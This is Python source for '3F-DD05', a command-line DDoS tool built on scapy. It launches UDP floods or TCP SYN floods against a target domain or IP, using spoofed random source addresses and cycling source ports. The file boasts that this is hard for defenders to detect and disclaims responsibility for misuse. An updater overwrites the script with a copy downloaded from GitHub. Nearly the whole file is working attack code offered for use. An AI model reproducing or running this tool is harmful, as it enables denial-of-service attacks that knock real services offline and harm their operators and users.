
####################################################################
##                                                                ##
##          Versoin: 1.0                                          ##
##          Name: 3F-DD05                                         ##
##          Author: evilfeonix                                    ##
##          Date: 29 - JANUARY - 2025                             ##
##          Website: www.evilfeonix.com                           ##
##          Email: evilfeonix@gmail.com                           ##
##          Twiter: https://x.com/evilfeonix                      ##
##          Github: https://github.com/evilfeonix                 ##
##          Youtube: https://youtube.com/evilfeonix               ##
##                                                                ##
####################################################################

## Note that we as the creators of this tool,
## We are not responsible for any misuse or damage caused by this program.
## Used this program at your own risk.

# Multiple IP multiple port
# A python script that conduct DDOS Attack by sending large number of packets to web
# server using multiple IPs and from multiple ports. This type of DOS attack offers a little bit diffecult challange
# for security defender to detect and block it 

import os, sys, time, socket, random, hashlib, threading

def slow(F3):
   for a in F3 + '\n':
      sys.stdout.write(a)
      sys.stdout.flush()
      time.sleep(1./300)

def installation():
   os.system(f"clear || cls")
   os.system(f"pkg install libffi libcrypt libpcap -y")
   os.system(f"pip install --upgrade pip")
   os.system(f"pip install scapy")
   os.system(f"pip install faker")
   os.system(f"pip install urllib2")


try:
   import scapy, faker, urllib.request
except:
   installation()

from datetime import datetime
from scapy.all import *
os.system(f"clear || cls")
from faker import Faker

# Extra Format
STOP="\x1b[0m"       # Stop or End Format
line="\x1b[4m"       # Underline Text

# background colors
bgR="\x1b[41m"       # Background Red
bgG="\x1b[42m"       # Background Green
bgY="\x1b[43m"       # Background Yellow
bgB="\x1b[44m"       # Background Blue 
bgP="\x1b[45m"       # Background Purple
bgC="\x1b[46m"       # Background Cyan
bgs=[bgR,bgG,bgY,bgB,bgP,bgC]

# text colors
frR="\x1b[91;1m"     # Red
frG="\x1b[92;1m"     # Green
frY="\x1b[93;1m"     # Yellow
frB="\x1b[94;1m"     # Blue
frP="\x1b[95;1m"     # Purple
frC="\x1b[96;1m"     # Cyan
frs=[frR,frG,frY,frB,frP,frC]

bgColor=random.choice(bgs)
frColor=random.choice(frs)
while bgColor[3] != frColor[3]:
   frColor=random.choice(frs)

bgColor=f"{bgColor}\x1b[97;1m"
add=f"{frC}[++]"
err=f"{frR}[--]"
info=f"{frG}[••]"
note=f"{frColor}[!!]"


def header():
   os.system(f"clear || cls")
   return f"""\x1b[97;1m                                                 
███████╗ ███████╗     ███████═╗   ███████═╗    ██████╗  ███████╗
     ██║ ██╔════╝     ██╔═══███╗  ██╔═══███╗  ██╔═══██╗ ██╔════╝
 █████╗  █████╗  ███╗ ██║ x  ███╗ ██║ x  ███╗ ██║ x ██║ ███████╗
     ██╗ ██╔══╝  ╚══╝ ██║   ███╔╝ ██║   ███╔╝ ██║   ██║      ██║
███████║ ██║          ███████╔═╝  ███████╔═╝  ╚██████╔╝ ███████║
╚══════╝ ╚═╝          ╚══════╝    ╚══════╝     ╚═════╝  ╚══════╝\x1b[0m
   {bgColor}Your Ultimate Tool For Conducting Distributed DOS Attack{STOP}
Author: {line}{frColor}evilfeonix{STOP}     Version: {frColor}{line}v[1.0]{STOP}     Tool: {line}{frColor}3vilFeonix-DD05{STOP}
         Github: {line}{frColor}https://github.com/evilfeonix{STOP}"""
   # os.system(f"echo {banner} | lolcat")

def fake_ip():
    return fake.ipv4()
   
def UDPflood(srcP,srcIP,dstP,dstIP,dstDomain,payload):
   ip = IP(src = srcIP, dst = dstIP)
   udp = UDP(sport = srcP, dport = dstP)
   if payload == 'default':
      raw = Raw(load=f"""GET / HTTP/1.1\r\nHost: {dstDomain}\r\nUser-Agent: {random.choice(UserAgents)}\r\n\r\n""")
   else:raw = Raw(load=f"{payload}\r\n\r\n")
   try:
      pkt = ip/udp/raw
      send(pkt, verbose=False)
   except Exception as a:
      print(f"{err} {a}.{STOP}")
      red_Flag.set()
      return

def SYNflood(srcP,srcIP,dstP,dstIP,dstDomain,payload):
   ip = IP(src = srcIP, dst = dstIP)
   tcp = TCP(sport = srcP, dport = dstP, flags="S")
   if payload == 'default':
      raw = Raw(load=f"""GET / HTTP/1.1\r\nHost: {dstDomain}\r\nUser-Agent: {random.choice(UserAgents)}\r\n\r\n""")
   else:raw = Raw(load=f"{payload}")
   try:
      pkt = ip/tcp/raw
      send(pkt, verbose=False)
   except Exception as a:
      print(f"{err} {a}.{STOP}")
      red_Flag.set()
      return


def domain2IP(host):
   try:
      from socket import gethostbyname
      hostip = gethostbyname(host)
   except socket.gaierror:
      slow(f'')
      slow(f'   {err} Failed to Resolve Domain: {host}...{STOP}')
      slow(f'   {err} Please Check your Internet Connection.{STOP}\n')
      os.sys.exit()
   except Exception as a:
      slow(f'')
      slow(f'   {err} Unkown Host: {a}{STOP}\n')
      os.sys.exit()
    
   try:
      from socket import gethostbyaddr
      domain = gethostbyaddr(hostip)
      domain = domain[0]
   except:domain = hostip
   return (hostip, domain)

def endAttack(idx,dstP,dstIP,dstHost,dstDomain,duration,atty):
   # os.system(f'echo "{header()}" | lolcat')
   slow(header())
   slow(f"{STOP}")
   slow(f"""===========================================================
     {frColor}Target Port: {dstP} {STOP}                      
     {frColor}Target IP: {dstIP} {STOP}                       
     {frColor}Target Domain: {dstDomain}{STOP}                  
     {frColor}Packate Sent: {idx}  {STOP}                     
     {frColor}Durations: {duration}{STOP}                     
     {frColor}Attack Type: {atty}  {STOP}                   
===========================================================
   {frColor}{idx} Packate successfully send to destination {dstIP}:{dstP} 
     in {duration} duration using {atty} Attack{STOP}

   {note} Follow Us on Github
   {note} Fork our Repositories  
   {note} Give our Repositories a Star
   {note} Contribute to our Repositories  
   {note} Contact us at evilfeonix@gmail.com 
{STOP}
         [++] {bgColor}Subscribe To Our YouTube Channel{STOP} [++]
===========================================================""")
   input(f"[++] {bgColor}Press [ENTER] to Continue{frColor}{STOP} ") 
   evilfeonix="https://github.com/evilfeonix" 
   os.system(f"xdg-open {evilfeonix}")
   os.sys.exit()

def AboutUs():
   slow(header())
   slow(f"===========================================================")
   slow(f"    {frColor}Version        ::   v[1.2]              ")
   slow(f"    Tool Name      ::   3F-DD05             ")
   slow(f"    Author         ::   evilfeonix          ")
   slow(f"    Github         ::   Digital Firebird    ")
   slow(f"    Youtube        ::   Digital Firebird    ")
   slow(f"    Latest Update  ::   11 - FEBUARY - 2025{STOP} ")
   slow(f"                                                              ")
   slow(f"         [++] {bgColor}Subscribe To Our YouTube Channel{STOP} [++]")
   slow(f"==========================================================={STOP}\n")
   input(f"[++] {bgColor}Press [ENTER] to Continue{frColor}{STOP} ") 
   evilfeonix="https://github.com/evilfeonix" 
   os.system(f"xdg-open {evilfeonix}")
   os.sys.exit()

def get_remote_hash(url):
   try:
      response = urllib.request.urlopen(url)
      data = response.read()
      return hashlib.md5(data).hexdigest()
   except Exception as e:
      slow(f"")
      slow(f"   {err} Please Check Your Internet Connection.{STOP}")
      slow(f"")
      os.sys.exit()

def get_local_hash(script_path):
   try:
      with open(script_path, 'rb') as f:
         data = f.read()
         return hashlib.md5(data).hexdigest()
   except Exception as e:
      slow(f"   {err} Error reading local script: {e}.{STOP}")
      os.sys.exit()


def UpdateUs(): 
   try:
      script_url = "https://github.com/evilfeonix/3F-DD05/raw/main/ddos.py"
      script_path = os.path.abspath(__file__)
      
      remote_hash = get_remote_hash(script_url)
      local_hash = get_local_hash(script_path)
      
      if remote_hash and local_hash and remote_hash == local_hash:
         time.sleep(2)
         slow(f"")
         slow(f"   {add} 3F-DD05 is Up-To Date.{STOP}\n")
         os.sys.exit()
        
      time.sleep(1)
      slow(f"   {add} Update Found...")
      time.sleep(1)
      slow(f"   {add} Downloading Latest Version...")
      time.sleep(3)
      urllib.request.urlretrieve(script_url, script_path)
      slow(f"{STOP}\n")
      time.sleep(5)
      slow(header())
      slow(f"===========================================================")
      slow(f"""   {info} 3F-DD05 Successfully Updated...,

   {note} Follow Us on Github
   {note} Fork our Repositories  
   {note} Give our Repositories a Star
   {note} Contribute to our Repositories  
   {note} Contact us at evilfeonix@gmail.com  
{STOP}
         [++] {bgColor}Subscribe To Our YouTube Channel{STOP} [++]
===========================================================""")
      input(f"[++] {bgColor}Press [ENTER] to Continue{frColor}{STOP} ") 
      evilfeonix="https://github.com/evilfeonix" 
      os.system(f"xdg-open {evilfeonix}")
      os.sys.exit()
         
   except Exception as e:
      slow(f"")
      slow(f"   {err} Error Updating 3F-DD05: {e}{STOP}\n")


def startAttack(target,dstP,atty,payload):
   idx = 0
   dstIP, dstDomain = domain2IP(target)
   os.system(f"clear || cls")
   slow(f"{note} Press Ctrl+C to Stop Attack!{STOP}") # Stopped Attack
   time.sleep(3/1)
   threads=[]
   strtTime = datetime.now()
   try:
      for spoofedP in range(1, 65535):
         if red_Flag.is_set():
            print(f"{note} Try Running the Program with Full Privillage")
            print(f"   sudo python3 {sys.argv[0]}")
            print(f"{note} Also Check Your Network Connection!{STOP}\n")
            os.sys.exit()

         spoofedIP = fake_ip()      # spoofed IP Address
         print(f"\x1b[97;1m{spoofedIP}:{spoofedP} ===> {dstIP}:{dstP}\x1b[0m ")

         if spoofedP == 65535:
            spoofedP = 1
         if atty == "udp":
            td = threading.Thread(target=UDPflood, args=(spoofedP,spoofedIP,dstP,dstIP,target,payload))
         else:
            td = threading.Thread(target=SYNflood, args=(spoofedP,spoofedIP,dstP,dstIP,target,payload))
         td.start()
         idx = idx + 1
      
      for td in threads:
         td.join()  # Wait for all threads to finish 
         
   except KeyboardInterrupt:
         endTime = datetime.now()
         # Stop threat

   if atty == "udp":
      atty="UDP Flooding"
   else:
      atty="TCP SYNFlood"

   time.sleep(1)
   endTime = datetime.now()
   slow(f"{note} Attack At Down! ~ ^_^ {STOP}")  # Attack At Down

   duration = endTime - strtTime
   time.sleep(2)
   endAttack(idx,dstP,dstIP,dstDomain,target,duration,atty)
   os.sys.exit()

def main():
   slow(header())
   slow(f"")
   slow(f"   [00]-{frColor}Exit 3F-DD05{STOP}")
   slow(f"   [01]-{frColor}About 3F-DD05{STOP}")
   slow(f"   [02]-{frColor}Launch 3F-DD05{STOP}")
   slow(f"   [03]-{frColor}Update 3F-DD05{STOP}")
   slow(f"")
   ch = input(f"   {bgColor}[>>] EvilFeonix-DDOS:{STOP}{frColor} ")

   if ch in ['0','00']:
      slow(f"""
   {err} Thanks for using 3F-DD05

   {note} Follow Us on Github
   {note} Fork our Repositories  
   {note} Give our Repositories a Star
   {note} Contribute to our Repositories  
   {note} Contact us at evilfeonix@gmail.com 
{STOP}
         [++] {bgColor}Subscribe To Our YouTube Channel{STOP} [++]
==========================================================={STOP}""")
      input(f"[++] {bgColor}Press [ENTER] to Continue{frColor}{STOP} ") 
      evilfeonix="https://github.com/evilfeonix" 
      os.system(f"xdg-open {evilfeonix}")
      slow(f"{STOP}")
      os.sys.exit()
   elif ch in ['1','01']:AboutUs()
   elif ch in ['2','02']:
      slow(f"{STOP}")
      slow(f"   [00]-{frColor}Back{STOP}")
      slow(f"   [01]-{frColor}UDP Flooding{STOP}")
      slow(f"   [02]-{frColor}TCP Synflood{STOP}")
      slow(f"")
      ch = input(f"   {bgColor}[>>] Enter Attack Type:{STOP}{frColor} ")

      if ch in ['0','00']:return main()
      elif ch in ['1','01']:atty="udp"
      elif ch in ['2','02']:atty="tcp"
      else:
         slow(f"")
         slow(f"   {err} Invalid Choice.{STOP}")
         os.sys.exit()
         
      slow(f"{STOP}")
      slow(f"   [00]-{frColor}Back{STOP}")
      slow(f"   [01]-{frColor}Port 80{STOP}")
      slow(f"   [02]-{frColor}Port 443{STOP}")
      slow(f"   [03]-{frColor}Custom Port{STOP}")
      slow(f"{STOP}")
      ch = input(f"   {bgColor}[>>] Select Target Port:{STOP}{frColor} ")
      if ch in ['0','00']:return main()
      elif ch in ['1','01']:port = 80
      elif ch in ['2','02']:port = 443
      elif ch in ['3','03']:
         try:
            slow(f"{STOP}")
            port = input(f"   {bgColor}[>>] Enter Target Port:{STOP}{frColor} ")
            port = int(port.strip())
         except:
            slow(f"{STOP}")
            slow(f"   {err} Only Numeric Data are Request.{STOP}")
            os.sys.exit()
      else:
         slow(f"{STOP}")
         slow(f"   {err} Invalid Choice.{STOP}")
         os.sys.exit()

      slow(f"{STOP}")
      slow(f"   [00]-{frColor}Back{STOP}")
      slow(f"   [01]-{frColor}Custom Payload{STOP}")
      slow(f"   [02]-{frColor}Default Payload{STOP}")
      slow(f"{STOP}")
      ch = input(f"   {bgColor}[>>] Choose a Payload:{STOP}{frColor} ")
      if ch in ['0','00']:return main()
      elif ch in ['1','01']:
         slow(f"{STOP}")
         payload = input(f"   {bgColor}[>>] Enter Custom Payload:{STOP}{frColor} ")
         if payload.strip() == "":
            slow(f"")
            slow(f"   {err} Payload Can Not Be Empty!{STOP}")
            os.sys.exit()

      elif ch in ['2','02']:payload = "default"
      else:
         slow(f"{STOP}")
         slow(f"   {err} Invalid Choice.{STOP}")
         os.sys.exit()

      slow(f"{STOP}")
      dstP = port
      payload = payload
      target = input(f"   {bgColor}[>>] Enter Target Domain or IP Addr:{STOP}{frColor} ")
      startAttack(target, port, atty, payload)

   elif ch in ['3','03']:UpdateUs()
   else:
      slow(f"{STOP}")
      slow(f'   {err} Invalid Choice{STOP}')
      os.sys.exit()

fake = Faker()
red_Flag = threading.Event()
UserAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
    "Opera/9.80 (J2ME/MIDP; Opera Mini/7.1.32052/29.3417; U; en) Presto/2.8.119 Version/11.10",
    "Mozilla/5.0 (Windows NT 5.1; rv:34.0) Gecko/20100101 Firefox/34.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/603.3.8 "
    "(KHTML, like Gecko) Version/10.1.2 Safari/603.3.8",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) "
    "Version/11.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"]

if __name__ == "__main__":
   try:
      main()
   except KeyboardInterrupt:
      slow(f"")
      slow(f"\n{err} User Requested an Interrupt!")
      slow(f"{err} Program Running Down...")
      time.sleep(2)
      slow(f"")
      os.sys.exit()
      
